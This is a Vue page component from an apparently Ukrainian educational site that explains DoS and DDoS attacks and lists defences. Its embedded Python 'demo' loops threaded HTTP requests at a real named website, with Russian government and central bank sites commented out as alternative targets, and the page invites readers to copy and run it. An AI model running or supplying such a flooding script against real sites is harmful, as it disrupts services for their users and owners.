<template>
  <n-space vertical :size="20">
    <n-card title="🌐 DoS / DDoS-атаки" embedded>
      <n-p>
        Атаки, метою яких є зробити сайт або сервер недоступним для користувачів. Зловмисники перевантажують систему численними запитами, через що вона перестає відповідати.
      </n-p>

      <n-divider />

      <n-p strong>Як це працює:</n-p>
      <n-ul>
        <n-li><strong>DoS (Denial of Service):</strong> атака з одного пристрою, що надсилає велику кількість запитів.</n-li>
        <n-li><strong>DDoS (Distributed Denial of Service):</strong> атака одночасно з багатьох пристроїв (ботнет), що ускладнює захист.</n-li>
        <n-li>Сервер не встигає обробляти всі запити і стає недоступним.</n-li>
      </n-ul>

      <n-card title="🧪 Python-демо: DoS-атака" embedded>
        <p>Нижче простий приклад коду для DoS-атаки. Скопіюйте і запустіть у середовищі Python :</p>
        <n-alert title="⚠️ Попередження" type="warning" class="mb-4" bordered>
          Не намагайтесь організовувати DoS-атаки самостійно.
          Це може бути кримінальним правопорушенням відповідно до законодавства.
        </n-alert>

        <n-button @click="show = !show" size="small" tertiary type="info" class="my-2">
          {{ show ? 'Сховати код' : 'Показати код' }}
        </n-button>

        <n-collapse-transition  v-if="show">
          <n-code
              v-if="show"
              language="python"
              show-line-numbers
              word-wrap
              class="rounded-lg"
              v-pre
          >
<pre>
import urllib.request
import threading
import time

# target_url = "https://www.cbr.ru/"  # Замінити на тестовий сайт
# target_url = "https://my.mos.ru"
target_url = "https://spark-interfax.ru"
num_threads = 10  # Зменшено для безпечного тесту
delay_seconds = 1  # Затримка між запитами

def attack():
    while True:
        try:
            response = urllib.request.urlopen(target_url)
            print(f"[{threading.current_thread().name}] Відповідь: {response.status}")
        except Exception as e:
            print(f"[{threading.current_thread().name}] Помилка: {e}")
        time.sleep(delay_seconds)

threads = []

for i in range(num_threads):
    t = threading.Thread(target=attack, name=f"Потік-{i+1}")
    t.start()
    threads.append(t)

</pre>
          </n-code>
        </n-collapse-transition>
      </n-card>

      <n-divider />

      <n-p strong>Приклади та наслідки:</n-p>
      <n-ul>
        <n-li>Атаки на банки, урядові сайти, школи, ЗМІ під час політичних конфліктів.</n-li>
        <n-li>Можуть використовуватись для шантажу або саботажу.</n-li>
        <n-li>Втрата доступу користувачів, зниження довіри до сервісу, фінансові збитки.</n-li>
      </n-ul>

      <n-divider />

      <n-p strong>Як захиститися:</n-p>
      <n-ul>
        <n-li>Використовувати анти-DDoS сервіси (Cloudflare, Google Shield та ін.).</n-li>
        <n-li>Обмежувати трафік та фільтрувати підозрілі IP-адреси.</n-li>
        <n-li>Використовувати CDN і кешування контенту для розвантаження серверів.</n-li>
        <n-li>Моніторити трафік і оперативно реагувати на аномалії.</n-li>
      </n-ul>
    </n-card>
    <Link
        text='Кіберфахівці ГУР атакували Центробанк РФ (2025)'
        url='https://suspilne.media/801393-kiberfahivci-gur-atakuvali-centrobank-rf/'
    />
  </n-space>
</template>

<script setup lang="ts">
import { ref } from 'vue'
import { NSpace, NCard, NDivider, NUl, NLi, NP, NButton, NCode, NCollapseTransition } from 'naive-ui';
import Link from '../Link.vue';

const show = ref(false)
</script>

<style scoped>
.my-2 {
  margin-top: 0.5rem;
  margin-bottom: 0.5rem;
}
</style>
